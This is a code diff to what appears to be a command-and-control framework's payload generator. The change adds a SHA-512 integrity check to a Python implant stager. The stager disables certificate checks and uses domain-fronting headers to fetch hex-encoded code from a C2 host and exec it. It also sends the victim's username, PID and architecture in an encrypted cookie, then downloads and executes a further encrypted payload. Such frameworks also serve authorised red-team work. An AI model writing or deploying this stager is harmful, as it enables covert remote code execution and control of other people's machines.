@@ -3,7 +3,7 @@
 from Core import *
 from Config import *
 from Colours import *
-import StringIO, gzip, io, base64, subprocess, os
+import StringIO, gzip, io, base64, subprocess, os, hashlib
 
 class Payloads(object):
 
@@ -27,7 +27,12 @@ class Payloads(object):
     self.ConnectURL = ConnectURL
     self.BaseDirectory = BaseDirectory
     self.PythonKey = gen_key()
-    self.Python = """import urllib2,os,sys,base64,ssl,socket,pwd
+    with open("%saes.py" % FilesDirectory, 'rb') as f:
+      content = f.read()
+      content = content.replace("#REPLACEKEY#","#%s" % self.PythonKey)
+      self.PythonHash = hashlib.sha512(content).hexdigest()
+    self.Python = """import urllib2,os,sys,base64,ssl,socket,pwd,hashlib
+pyhash="%s"
 pykey="%s"
 key="%s"
 url="%s"
@@ -38,7 +43,8 @@ ssl._create_default_https_context=ssl._create_unverified_context
 if hh: r=urllib2.Request(url,headers={'Host':hh,'User-agent':ua})
 else: r=urllib2.Request(url,headers={'User-agent':ua})
 res=urllib2.urlopen(r);d=res.read();c=d[1:];b=c.decode("hex") 
-if pykey in b: exec(b)
+s=hashlib.sha512(b)
+if pykey in b and pyhash == s.hexdigest(): exec(b)
 else: sys.exit(0)
 un=pwd.getpwuid( os.getuid() )[ 0 ];pid=os.getpid()
 is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
@@ -47,7 +53,7 @@ encsid=encrypt(key, '%%s;%%s;%%s;%%s;%%s;' %% (un,hn,hn,arch,pid))
 if hh:r=urllib2.Request(url2,headers={'Host':hh,'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
 else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
 res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\\0');exec(x)
-    """ % (self.PythonKey,self.Key,(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"),(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"),self.DomainFrontHeader,self.UserAgent)
+    """ % (self.PythonHash,self.PythonKey,self.Key,(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"),(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"),self.DomainFrontHeader,self.UserAgent)
     self.C2Core = """%s
 $sc="%s"
 $s="%s"
